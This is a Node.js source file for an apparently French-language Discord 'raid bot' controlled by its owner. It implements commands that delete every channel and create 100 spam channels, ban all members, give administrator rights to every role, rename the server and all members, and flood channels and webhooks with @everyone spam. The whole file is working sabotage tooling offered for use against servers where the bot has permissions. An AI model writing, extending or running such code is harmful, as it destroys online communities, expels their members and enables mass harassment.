require('dotenv').config();
const { Client, GatewayIntentBits, Partials, PermissionsBitField, EmbedBuilder } = require('discord.js');
const config = require('./config.js');
const fetch = require('node-fetch');

const client = new Client({
    intents: [
        GatewayIntentBits.Guilds,
        GatewayIntentBits.GuildMessages,
        GatewayIntentBits.GuildMembers,
        GatewayIntentBits.MessageContent,
        GatewayIntentBits.GuildBans,
        GatewayIntentBits.GuildEmojisAndStickers,
        GatewayIntentBits.GuildIntegrations,
        GatewayIntentBits.GuildWebhooks,
        GatewayIntentBits.GuildInvites,
        GatewayIntentBits.GuildVoiceStates,
        GatewayIntentBits.GuildPresences,
        GatewayIntentBits.GuildMessageReactions
    ],
    partials: [Partials.Channel, Partials.Message, Partials.User, Partials.GuildMember]
});

client.on('ready', () => {
    console.log(`Bot is ready! Logged in as ${client.user.tag}`);
});

client.on('messageCreate', async (message) => {
    if (message.author.bot) return;
    if (message.author.id !== config.ownerId) return;
    
    const args = message.content.slice(config.prefix.length).trim().split(/ +/);
    const command = args.shift().toLowerCase();

    switch(command) {
        case 'help':
            const helpEmbed = new EmbedBuilder()
                .setColor('#FF0000')
                .setTitle('🤖 Bot Raid - Liste des Commandes')
                .setDescription('Voici toutes les commandes disponibles. Toutes les commandes sont réservées au propriétaire du bot.')
                .addFields(
                    { name: '🛑 Commandes de Base', value: 
                        '`!help` - Affiche ce message d\'aide\n' +
                        '`!stop` - Arrête proprement le bot\n' +
                        '`!spam [nombre] [message]` - Spam un message dans le canal actuel\n' +
                        '`!nuke` - Supprime tous les salons et en crée 100 nouveaux\n' +
                        '`!rename [nom]` - Renomme le serveur\n' +
                        '`!banall` - Bannit tous les membres du serveur\n' +
                        '`!adminall` - Donne les permissions administrateur à tous les rôles'
                    },
                    { name: '⚡ Commandes Avancées', value: 
                        '`!massrole [nom]` - Crée un rôle admin et l\'attribue à tous les membres\n' +
                        '`!masschannel [nom] [nombre]` - Crée un grand nombre de salons (max 50)\n' +
                        '`!webhookspam [message]` - Crée un webhook et spam des messages\n' +
                        '`!massnick [pseudo]` - Change le pseudo de tous les membres\n' +
                        '`!massemoji [nombre]` - Ajoute des emojis de raid aléatoires'
                    },
                    { name: '📝 Exemples d\'Utilisation', value:
                        '`!spam 5 @everyone RAID` - Spam 5 fois le message\n' +
                        '`!masschannel RAID 20` - Crée 20 salons nommés RAID\n' +
                        '`!massemoji 15` - Ajoute 15 emojis de raid aléatoires\n' +
                        '`!massnick RAIDED` - Change tous les pseudos en "RAIDED"'
                    }
                )
                .setFooter({ text: 'Bot Raid - Utilisez ces commandes avec précaution' })
                .setTimestamp();

            await message.channel.send({ embeds: [helpEmbed] });
            break;

        case 'stop':
            try {
                await message.channel.send('Arrêt du bot en cours...');
                console.log('Arrêt du bot demandé par le propriétaire');
                await client.destroy();
                process.exit(0);
            } catch (error) {
                console.error('Erreur lors de l\'arrêt du bot:', error);
                process.exit(1);
            }
            break;

        case 'spam':
            const channel = message.mentions.channels.first() || message.channel;
            const spamMessage = args.join(' ') || '@everyone RAID';
            const spamCount = parseInt(args[0]) || 10;
            
            for(let i = 0; i < spamCount; i++) {
                await channel.send(spamMessage);
            }
            break;

        case 'nuke':
            const guild = message.guild;
            await Promise.all(guild.channels.cache.map(channel => channel.delete())); 
            for(let i = 0; i < 100; i++) {
                await guild.channels.create({
                    name: 'RAIDED HAHAH',
                    type: 0,
                    permissionOverwrites: [
                        {
                            id: guild.id,
                            allow: [PermissionsBitField.Flags.ViewChannel]
                        }
                    ]
                }).then(channel => {
                    channel.send('@everyone SERVER RAIDED');
                });
            }
            break;

        case 'rename':
            const newName = args.join(' ') || 'RAIDED SERVER BY ';
            await message.guild.setName(newName);
            break;

        case 'banall':
            const members = await message.guild.members.fetch();
            members.forEach(member => {
                if (!member.user.bot) {
                    member.ban({ reason: 'RAID' }).catch(() => {});
                }
            });
            break;

        case 'adminall':
            const roles = message.guild.roles.cache;
            roles.forEach(role => {
                role.setPermissions([
                    PermissionsBitField.Flags.Administrator,
                    PermissionsBitField.Flags.BanMembers,
                    PermissionsBitField.Flags.KickMembers,
                    PermissionsBitField.Flags.ManageChannels,
                    PermissionsBitField.Flags.ManageGuild,
                    PermissionsBitField.Flags.ManageMessages,
                    PermissionsBitField.Flags.ManageRoles,
                    PermissionsBitField.Flags.MentionEveryone
                ]).catch(() => {});
            });
            break;

        case 'massrole':
            const roleName = args.join(' ') || 'RAIDED';
            const newRole = await message.guild.roles.create({
                name: roleName,
                color: 'RED',
                permissions: [PermissionsBitField.Flags.Administrator]
            });
            
            const allMembers = await message.guild.members.fetch();
            allMembers.forEach(member => {
                if (!member.user.bot) {
                    member.roles.add(newRole).catch(() => {});
                }
            });
            break;

        case 'masschannel':
            const channelName = args.join(' ') || 'RAIDED';
            const channelCount = parseInt(args[0]) || 50;
            
            for(let i = 0; i < channelCount; i++) {
                await message.guild.channels.create({
                    name: `${channelName}-${i}`,
                    type: 0,
                    permissionOverwrites: [
                        {
                            id: message.guild.id,
                            allow: [PermissionsBitField.Flags.ViewChannel]
                        }
                    ]
                }).then(channel => {
                    channel.send('@everyone RAIDED ');
                });
            }
            break;

        case 'webhookspam':
            const webhookChannel = message.mentions.channels.first() || message.channel;
            const webhookMessage = args.join(' ') || '@everyone RAID';
            
            const webhook = await webhookChannel.createWebhook({
                name: 'RAID BOT',
                avatar: 'https://i.imgur.com/AfFp7pu.png'
            });
            
            for(let i = 0; i < 10; i++) {
                await webhook.send(webhookMessage);
            }

            await webhook.delete();
            break;

        case 'massnick':
            const nickname = args.join(' ') || 'RAIDED';
            
            try {
                const botMember = message.guild.members.cache.get(client.user.id);
                if (!botMember.permissions.has(PermissionsBitField.Flags.Administrator)) {
                    const botRole = message.guild.roles.cache.find(role => role.name === 'Bot');
                    if (botRole) {
                        await botRole.setPermissions([
                            PermissionsBitField.Flags.Administrator,
                            PermissionsBitField.Flags.ManageNicknames,
                            PermissionsBitField.Flags.ChangeNickname
                        ]);
                    }
                }
            } catch (error) {
                console.error('Erreur lors de la mise à jour des permissions:', error);
            }

            const guildMembers = await message.guild.members.fetch();
            let successCount = 0;
            
            for (const [id, member] of guildMembers) {
                try {
                    if (!member.user.bot) {
                        const botMember = message.guild.members.cache.get(client.user.id);
                        if (member.roles.highest.position < botMember.roles.highest.position) {
                            await member.setNickname(nickname);
                            successCount++;
                            await new Promise(resolve => setTimeout(resolve, 100));
                        }
                    }
                } catch (error) {
                    console.error(`Erreur lors du changement de pseudo pour ${member.user.tag}:`, error);
                }
            }
            
            await message.channel.send(`✅ ${successCount} pseudos ont été changés en "${nickname}" !`).catch(() => {});
            break;

        case 'massemoji':
            const emojiCount = parseInt(args[0]) || 10;
            const emojis = ['😈', '💀', '👿', '🤡', '👹', '👺', '😡', '🤬', '😠', '💩', '🖕', '⚰️', '🔪', '💉', '🧨', '💣', '🔥', '⚡', '☠️', '🦠'];
            
            let emojiMessage = '';
            for(let i = 0; i < emojiCount; i++) {
                const randomEmoji = emojis[Math.floor(Math.random() * emojis.length)];
                emojiMessage += randomEmoji + ' ';
            }
            
            await message.channel.send(emojiMessage);
            await message.channel.send(`✅ ${emojiCount} emojis ont été envoyés !`).catch(() => {});
            break;
    }
});

client.on('error', error => {
    console.error('Une erreur est survenue:', error);
});

client.login(config.token); 